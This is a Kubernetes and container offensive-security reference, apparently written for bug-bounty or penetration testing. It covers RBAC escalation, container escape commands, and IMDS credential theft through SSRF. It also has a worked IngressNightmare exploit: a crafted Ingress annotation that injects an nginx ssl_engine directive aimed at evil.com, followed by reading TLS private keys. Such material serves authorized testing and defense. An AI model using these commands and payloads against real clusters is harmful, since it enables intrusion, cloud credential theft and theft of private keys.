# Kubernetes & Container Security Deep Dive

> Referenced from [cloud-security SKILL.md](../SKILL.md) — managed K8s provider specifics, RBAC escalation, ingress controller exploitation, container escape, admission controller bypass, service mesh auth, registry testing, and worked examples.

## Table of Contents

- [Managed K8s Provider Specifics](#managed-k8s-provider-specifics)
- [RBAC Escalation Patterns](#rbac-escalation-patterns)
- [Ingress Controller Exploitation](#ingress-controller-exploitation)
- [Container Escape Techniques](#container-escape-techniques)
- [Pod Security & Admission Controllers](#pod-security--admission-controllers)
- [Service Mesh Auth Testing](#service-mesh-auth-testing)
- [Container Registry Testing](#container-registry-testing)
- [Secrets & ConfigMap Exposure](#secrets--configmap-exposure)
- [Network Policy Testing](#network-policy-testing)
- [Helm & GitOps Security](#helm--gitops-security)
- [Worked Example: EKS IMDS Credential Theft](#worked-example-eks-imds-credential-theft)
- [Worked Example: IngressNightmare Exploitation](#worked-example-ingressnightmare-exploitation)
- [CVE Reference Table](#cve-reference-table)

---

## Managed K8s Provider Specifics

Each managed K8s platform has different security defaults and attack surfaces. Test based on the target's provider.

### Amazon EKS

| # | Pattern | Test | What to Look For |
|---|---------|------|-----------------|
| 1 | IMDS credential theft | From compromised pod: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/` | Node IAM role creds — even with IMDSv2, hop limit >1 allows pod access |
| 2 | Pod Identity vs IRSA | Check if pods use `eks.amazonaws.com/role-arn` annotation or EKS Pod Identity | IRSA with overprivileged roles; Pod Identity misconfigured trust policy |
| 3 | aws-auth ConfigMap | `kubectl get configmap aws-auth -n kube-system -o yaml` | Overprivileged IAM role mappings, wildcard principals |
| 4 | EKS public endpoint | Check if API server endpoint is public (`endpointPublicAccess: true`) | Exposed API server without CIDR restrictions |
| 5 | EKS add-ons | Enumerate installed add-ons (vpc-cni, coredns, kube-proxy, ebs-csi) | Outdated add-ons with known CVEs |
| 6 | ECR pull-through cache | Check for misconfigured pull-through cache rules | Unauthorized image access via cache misconfiguration |

**Critical EKS pattern:** IMDSv2 enforcement requires *both* `HttpTokens: required` AND `HttpPutResponseHopLimit: 1` on worker nodes. Many clusters enforce IMDSv2 but leave hop limit at 2, allowing pods to reach IMDS through the container network hop.

### Google GKE

| # | Pattern | Test | What to Look For |
|---|---------|------|-----------------|
| 1 | Workload Identity | Check if pods mount metadata server or use `iam.gke.io/gcp-service-account` annotation | Pods without Workload Identity can access node SA (may have `editor` role on orgs created before May 2024) |
| 2 | Metadata concealment | `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/` from pod | If metadata concealment is disabled, pods access node-level metadata |
| 3 | GKE Autopilot vs Standard | Standard mode allows privileged pods; Autopilot enforces PodSecurity | Autopilot bypasses via mutation webhooks |
| 4 | Binary Authorization | Check if container image verification is enforced | Unsigned/untrusted images can be deployed |
| 5 | Fleet/Hub membership | Multi-cluster fleet with shared config | Cross-cluster access via fleet identity |

**Critical GKE pattern:** Default compute service account may have `project/editor` role (orgs created before May 3, 2024; newer orgs enforce `iam.automaticIamGrantsForDefaultServiceAccounts` constraint). Pods without Workload Identity inherit this SA — any SSRF or RCE in a pod → GCP project compromise. Always check the SA's actual IAM bindings.

### Azure AKS

| # | Pattern | Test | What to Look For |
|---|---------|------|-----------------|
| 1 | Managed identity | Check pod identity (AAD Pod Identity v1 deprecated → Workload Identity v2) | Legacy AAD Pod Identity v1 has known bypass via IMDS spoofing |
| 2 | AKS RBAC modes | Azure RBAC vs Kubernetes RBAC vs both | Mismatched RBAC modes leaving authorization gaps |
| 3 | Azure Key Vault CSI | Secrets Store CSI driver with Azure Key Vault provider | SecretProviderClass misconfiguration, overprivileged managed identity |
| 4 | AKS HTTP application routing | Check if HTTP application routing add-on is enabled | Legacy add-on uses permissive ingress defaults |
| 5 | AKS node access | `kubectl debug node/{node} -it --image=mcr.microsoft.com/cbl-mariner/busybox:2.0` | Node shell access via kubectl debug (requires cluster-admin) |

---

## RBAC Escalation Patterns

Kubernetes RBAC misconfigurations are the most common privilege escalation path. These patterns work across all K8s distributions.

| # | Pattern | What to Test | Impact |
|---|---------|-------------|--------|
| 1 | Wildcard verbs/resources | `kubectl auth can-i --list` — look for `*` on verbs or resources | Full cluster control from a single binding |
| 2 | Create pods → escape | `can-i create pods` → mount hostPath, privileged, or hostPID | Pod creation ≈ node-level access |
| 3 | Bind/escalate verbs | `can-i bind clusterroles` or `can-i escalate roles` | Self-escalation to cluster-admin |
| 4 | Impersonate users | `can-i impersonate users` | Impersonate any user including system:admin |
| 5 | CSR signing | `can-i create certificatesigningrequests` | Generate certs for any identity |
| 6 | Token request | `can-i create serviceaccounts/token` | Mint tokens for any SA |
| 7 | Secrets read | `can-i get secrets` (cluster-wide) | Read all secrets including SA tokens, TLS certs |
| 8 | Patch/update deployments | `can-i patch deployments` | Inject containers, mount hostPath, change image |
| 9 | Node/proxy | `can-i create nodes/proxy` | Direct kubelet API access via API server proxy |
| 10 | PV create | `can-i create persistentvolumes` | Mount arbitrary host paths via PV definitions |

**Escalation chain:** `create pods` → privileged pod with `hostPID` + `hostNetwork` → `nsenter -t 1 -m -u -i -n -p -- bash` → root on node → access all pod secrets + IMDS creds.

---

## Ingress Controller Exploitation

Ingress controllers are the most exposed K8s components — they process untrusted traffic from the internet.

### IngressNightmare (CVE-2025-1974, CVSS 9.8)

The most significant K8s vulnerability of 2025. Affected ~43% of cloud environments running ingress-nginx.

**Attack chain:**
1. Attacker has pod network access (another compromised pod, or ingress-nginx admission webhook is exposed)
2. Send crafted AdmissionReview request to the admission controller (port 8443)
3. Inject NGINX configuration directives via unsanitized annotations (`auth-url`, `auth-tls-match-cn`, `mirror-target`)
4. Configuration injection → arbitrary code execution in the ingress-nginx controller pod
5. Controller pod has access to all TLS secrets in the cluster → mass secret theft

**Test procedure:**
```
1. Check if ingress-nginx admission webhook is accessible:
   curl -k https://{ingress-nginx-pod-ip}:8443/
2. Check ingress-nginx version:
   kubectl get pods -n ingress-nginx -o jsonpath='{.items[0].spec.containers[0].image}'
3. Vulnerable: < v1.11.5 or < v1.12.1
4. Check if admission controller validating webhook has network exposure:
   kubectl get validatingwebhookconfigurations
```

**Related CVEs:** CVE-2025-1097 (auth-tls-match-cn injection, CVSS 8.8), CVE-2025-1098 (mirror-target/mirror-host injection, CVSS 8.8), CVE-2025-24514 (auth-url injection, CVSS 8.8).

### Other Ingress Controllers

| Controller | What to Test |
|-----------|-------------|
| **Traefik** | Dashboard exposure (`/dashboard/`), middleware bypass, HTTP/2 request smuggling |
| **HAProxy Ingress** | Config injection via annotations, stats page exposure |
| **Kong** | Admin API exposure (port 8001/8444), plugin configuration injection |
| **Ambassador/Emissary** | Admin interface, mapping injection, rate limit bypass |
| **Istio Gateway** | See [Service Mesh Auth Testing](#service-mesh-auth-testing) |

---

## Container Escape Techniques

When you have code execution inside a container, test these escape paths.

| # | Technique | Prerequisite | Test |
|---|-----------|-------------|------|
| 1 | Privileged container | `privileged: true` in securityContext | `mount /dev/sda1 /mnt && chroot /mnt` |
| 2 | Host PID namespace | `hostPID: true` | `nsenter -t 1 -m -u -i -n -p -- bash` |
| 3 | Host network | `hostNetwork: true` | Direct access to node network, IMDS, other pods |
| 4 | Docker socket mount | `/var/run/docker.sock` mounted | `docker run -v /:/host --privileged alpine chroot /host` |
| 5 | Host path mount | Sensitive host paths mounted (/, /etc, /root) | Read host filesystem, write crontabs |
| 6 | SYS_ADMIN capability | `capabilities: add: [SYS_ADMIN]` | cgroup escape: write to `release_agent` |
| 7 | SYS_PTRACE capability | `capabilities: add: [SYS_PTRACE]` | Process injection on host via `ptrace` |
| 8 | Service account token | `/var/run/secrets/kubernetes.io/serviceaccount/token` | `kubectl --token=$(cat /var/run/secrets/...) auth can-i --list` |

**Quick check from inside a container:**
```bash
# Check if privileged
cat /proc/1/status | grep CapEff
# CapEff: 0000003fffffffff = privileged (all capabilities)
# Check mounted paths
mount | grep -E 'docker.sock|/host|/etc/kubernetes'
# Check service account
ls /var/run/secrets/kubernetes.io/serviceaccount/
```

---

## Pod Security & Admission Controllers

### Pod Security Admission (PSA)

K8s built-in admission controller replacing PodSecurityPolicy (removed in v1.25).

| Level | What It Blocks | Bypass Test |
|-------|---------------|-------------|
| **Privileged** | Nothing — allows everything | N/A (no restrictions) |
| **Baseline** | Known privilege escalations (hostNetwork, hostPID, privileged) | Test: `hostIPC`, some capabilities, ephemeral containers |
| **Restricted** | Most host access, must run as non-root, drop ALL capabilities | Test: `seccompProfile` misconfig, init container gaps |

**Common gaps:**
- PSA `enforce` mode only rejects at the Pod level; `audit` and `warn` also check workload resources (Deployments, Jobs) but don't block them — mutations after admission can bypass enforce
- Namespace labels can be modified: `pod-security.kubernetes.io/enforce: privileged` → remove all restrictions
- Exempt users/namespaces (kube-system is often exempt)

### Policy Engine Bypass (Kyverno, OPA/Gatekeeper)

| # | Pattern | Test | Impact |
|---|---------|------|--------|
| 1 | Kyverno apiCall namespace escape (CVE-2026-22039, CVSS 10.0) | Create namespaced Policy with `context.apiCall` using variable substitution in `urlPath` | Hijack Kyverno SA to read secrets/ConfigMaps cross-namespace |
| 2 | OPA constraint template injection | Inject Rego code via resource labels/annotations processed by OPA | Policy bypass or information disclosure |
| 3 | Webhook timeout bypass | Send requests that cause admission webhook to timeout (default 10s, max 30s) | `failurePolicy: Ignore` → bypassed policy |
| 4 | Dry-run mode gap | `kubectl apply --dry-run=server` may not trigger admission webhooks | Test if policies are enforced on dry-run |
| 5 | Ephemeral container gap | Create ephemeral debug containers — often exempt from pod security policies | Privileged container in restricted namespace |

---

## Service Mesh Auth Testing

### Istio / Envoy

| # | Pattern | Test | Impact |
|---|---------|------|--------|
| 1 | AuthorizationPolicy bypass | Send request to sidecar directly (port 15006 inbound) vs through mesh (port 15001) | Policy applied on one path but not the other |
| 2 | mTLS permissive mode | Check PeerAuthentication — `PERMISSIVE` allows plaintext bypass | Skip mTLS entirely, bypass identity-based auth |
| 3 | TLS null byte bypass (CVE-2025-66220, CVSS 8.1) | Certificate with OTHERNAME SAN containing null byte | Impersonate matched identity, bypass TLS auth |
| 4 | Request smuggling (CVE-2025-64763) | Early data after CONNECT upgrade in WebSocket traffic | Request smuggling via Envoy proxy |
| 5 | External authorization bypass | Envoy `ext_authz` filter ordering — request modification after authz check | Bypass external authorization service |
| 6 | Sidecar injection skip | Label namespace `istio-injection: disabled` or use `sidecar.istio.io/inject: "false"` | Deploy pods without sidecar → bypass mesh policies |
| 7 | Headless service direct access | Direct pod IP access bypasses VirtualService routing and AuthorizationPolicy | Access backend services without mesh enforcement |

### Linkerd

| # | Pattern | Test |
|---|---------|------|
| 1 | Authorization policy gaps | Check if `ServerAuthorization` covers all ports/routes |
| 2 | Skip-inbound-ports | Ports listed in `config.linkerd.io/skip-inbound-ports` bypass proxy |
| 3 | Opaque transport | Non-HTTP traffic may not enforce identity-based policies |

---

## Container Registry Testing

| Registry | # | Pattern | Test |
|----------|---|---------|------|
| **ECR** | 1 | Public repository | Check `ecr-public.aws` for unintended public images |
| | 2 | Cross-account pull | IAM policy allows `ecr:GetDownloadUrlForLayer` from `*` principal |
| | 3 | Image scan results | `aws ecr describe-image-scan-findings` — scan results may reveal vuln data |
| **GCR/Artifact Registry** | 1 | Public bucket (legacy GCR) | Legacy GCR uses GCS — `gs://artifacts.{project}.appspot.com/` may be public |
| | 2 | allUsers viewer | Artifact Registry with `allUsers` having `artifactregistry.reader` role |
| | 3 | Image metadata | Container image labels, env vars, embedded secrets visible via `docker inspect` |
| **ACR** | 1 | Anonymous pull | `az acr show --query "anonymousPullEnabled"` — anonymous pull may be enabled |
| | 2 | Admin account | Admin account enabled with shared credentials |
| | 3 | Content trust disabled | Unsigned images deployed without verification |

**Cross-registry pattern:** Pull target's container images → inspect layers for embedded secrets, hardcoded credentials, internal URLs, API keys. Use `docker history --no-trunc` and `docker inspect` to extract metadata.

---

## Secrets & ConfigMap Exposure

| # | Pattern | Test | Impact |
|---|---------|------|--------|
| 1 | Default SA token auto-mount | Pods automatically mount SA token at `/var/run/secrets/kubernetes.io/serviceaccount/` | Token may have cluster-wide read access |
| 2 | Secrets in environment vars | `kubectl get pods -o jsonpath='{.spec.containers[*].env}'` | Secrets visible in `kubectl describe pod`, process listing, core dumps |
| 3 | etcd plaintext | Check if etcd encryption at rest is enabled | Secrets stored in plaintext in etcd |
| 4 | Secret enumeration | `kubectl get secrets --all-namespaces` (if RBAC allows) | All cluster secrets exposed including TLS certs, docker configs |
| 5 | ConfigMap with credentials | `kubectl get configmaps --all-namespaces -o yaml \| grep -i password` | Database passwords, API keys in ConfigMaps |
| 6 | External Secrets Operator | Check `ExternalSecret` and `SecretStore` resources | Overprivileged access to vault/secrets manager |

---

## Network Policy Testing

| # | Pattern | Test | Impact |
|---|---------|------|--------|
| 1 | No network policies | `kubectl get networkpolicies --all-namespaces` — empty = allow-all | Any pod can reach any pod + external |
| 2 | Egress not restricted | NetworkPolicy with ingress rules but no egress | Pod can exfiltrate data, reach IMDS, reach internet |
| 3 | DNS egress gap | Egress policies allow UDP 53 (DNS) | DNS tunneling for data exfiltration |
| 4 | Metadata endpoint access | No policy blocking 169.254.169.254 | IMDS access from any pod |
| 5 | CNI bypass | Some CNIs (e.g., Flannel without Calico) don't enforce NetworkPolicies | Policies exist but are not enforced |
| 6 | Namespace label selector | NetworkPolicy uses `namespaceSelector` with mutable labels | Attacker adds label to their namespace to match policy |

---

## Helm & GitOps Security

### Helm Chart Misconfigurations

| # | Pattern | What to Look For |
|---|---------|-----------------|
| 1 | Secrets in values.yaml | `helm get values {release}` — credentials in plain text |
| 2 | Hardcoded passwords | Default passwords in `values.yaml` that aren't overridden |
| 3 | Tiller (Helm v2 legacy) | Tiller SA with cluster-admin — grpc on port 44134 |
| 4 | Chart repository poisoning | Unsigned charts, HTTP-only chart repos |
| 5 | Overprivileged RBAC | Chart installs ClusterRoleBindings with `cluster-admin` |

### GitOps (Argo CD / Flux)

| # | Pattern | Test | Impact |
|---|---------|------|--------|
| 1 | Argo CD credential exposure (CVE-2025-55190, CVSS 10.0) | GET `/api/v1/projects/{project}/detailed` with project-level API token | Plain-text repository credentials leaked |
| 2 | Argo CD XSS (CVE-2025-47933) | Inject script in repository URL on repositories page | Arbitrary API actions as victim user |
| 3 | Flux source-controller SSRF | Flux GitRepository/HelmRepository with attacker-controlled URL | Internal network scanning, metadata access |
| 4 | Git credential exposure | Check Argo CD/Flux secrets for stored Git credentials | Repository access via leaked creds |
| 5 | Manifest injection | PR with malicious K8s manifests triggers auto-sync | Arbitrary workload deployment |

---

## Worked Example: EKS IMDS Credential Theft

**Scenario:** Target runs web application on EKS. SSRF vulnerability found in image proxy feature.

### Step 1 — Confirm SSRF reaches IMDS

```http
GET /api/proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: app.target.com

Response:
ami-id
ami-launch-index
instance-id
instance-type
iam/
...
```

### Step 2 — Check IMDSv2 enforcement

```http
GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: app.target.com

Response (IMDSv1 accessible — hop limit > 1):
eks-node-role
```

### Step 3 — Extract node role credentials

```http
GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-node-role HTTP/1.1
Host: app.target.com

Response:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-03-12T03:00:00Z"
}
```

### Step 4 — Enumerate access

```bash
# Using extracted credentials
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

aws sts get-caller-identity
# → arn:aws:sts::123456789012:assumed-role/eks-node-role/i-0abc123

aws s3 ls
# → List of S3 buckets (node role often has ECR + S3 access)

aws ecr list-images --repository-name app
# → Container image list
```

### Evidence checklist

```
□ SSRF request/response showing IMDS access
□ Extracted IAM credentials (redact SecretAccessKey)
□ aws sts get-caller-identity output showing role
□ Demonstrated access to at least one AWS service
□ Note whether IMDSv2 is enforced vs hop limit misconfigured
□ Compare with intended pod-level IRSA/Pod Identity permissions
```

**Impact:** SSRF → IMDS → node IAM role with ECR pull + S3 read access → all container images and S3 data readable. Severity: Critical (CVSS 9.8) when node role has broad permissions.

---

## Worked Example: IngressNightmare Exploitation

**Scenario:** Target uses ingress-nginx (version < 1.12.1). Attacker has access from a compromised pod.

### Step 1 — Verify admission webhook accessibility

```bash
# From inside a pod on the cluster network
curl -k https://ingress-nginx-controller-admission.ingress-nginx.svc:443/
# 405 Method Not Allowed = admission webhook is accessible
```

### Step 2 — Identify ingress-nginx version

```bash
kubectl get pods -n ingress-nginx -o jsonpath='{.items[0].spec.containers[0].image}'
# registry.k8s.io/ingress-nginx/controller:v1.11.3 → VULNERABLE
```

### Step 3 — Configuration injection via annotation

Create an Ingress resource with injected `auth-url` annotation:

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: exploit
  annotations:
    nginx.ingress.kubernetes.io/auth-url: "http://evil.com/#;}\nssl_engine evil_shared_lib;\n"
spec:
  rules:
  - host: exploit.target.com
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: web
            port:
              number: 80
```

### Step 4 — Impact: Secret theft

The ingress-nginx controller pod has access to all TLS secrets in the cluster (it needs them to serve HTTPS). Code execution in the controller → read all secrets:

```bash
# From inside compromised ingress-nginx controller
ls /etc/ingress-controller/ssl/
cat /etc/ingress-controller/ssl/*.pem
# → All TLS private keys and certificates
```

### Evidence checklist

```
□ Ingress-nginx version confirmation (vulnerable < v1.11.5 / v1.12.1)
□ Admission webhook accessibility proof
□ Configuration injection via annotation (crafted Ingress resource)
□ Code execution proof (command output from controller pod)
□ Secret access proof (list of TLS secrets readable)
□ Note: requires pod network access (not internet-facing)
```

**Impact:** Pod network access → RCE in ingress-nginx → all cluster TLS secrets. Severity: Critical (CVSS 9.8). Report as: unauthenticated (from pod network) remote code execution with cluster-wide secret theft.

---

## CVE Reference Table

| CVE | Component | CVSS | Description | Bug Bounty Relevance |
|-----|-----------|------|-------------|---------------------|
| CVE-2025-1974 | ingress-nginx | 9.8 | IngressNightmare — unauthenticated RCE via admission webhook, config injection | ~43% of cloud K8s environments affected |
| CVE-2025-1097 | ingress-nginx | 8.8 | auth-tls-match-cn annotation injection → config injection → RCE | Part of IngressNightmare chain |
| CVE-2025-1098 | ingress-nginx | 8.8 | mirror-target/mirror-host annotation injection → RCE | Part of IngressNightmare chain |
| CVE-2025-24514 | ingress-nginx | 8.8 | auth-url annotation injection → config injection → RCE | Part of IngressNightmare chain |
| CVE-2026-22039 | Kyverno | 10.0 | Namespaced Policy apiCall namespace escape via urlPath variable substitution | Hijack Kyverno SA for cross-namespace access |
| CVE-2025-55190 | Argo CD | 10.0 | Project API token exposes plain-text repository credentials via /detailed endpoint | Critical for GitOps deployments |
| CVE-2025-47933 | Argo CD | 9.0 (CNA) | XSS on repositories page via URL protocol injection | Arbitrary API actions as victim |
| CVE-2025-66220 | Istio/Envoy | 8.1 | TLS OTHERNAME SAN null byte bypass → identity impersonation | Bypass mTLS-based authorization |
| CVE-2025-64763 | Istio/Envoy | 5.3 | Request smuggling via early data after CONNECT upgrade (WebSocket) | HTTP smuggling through service mesh |
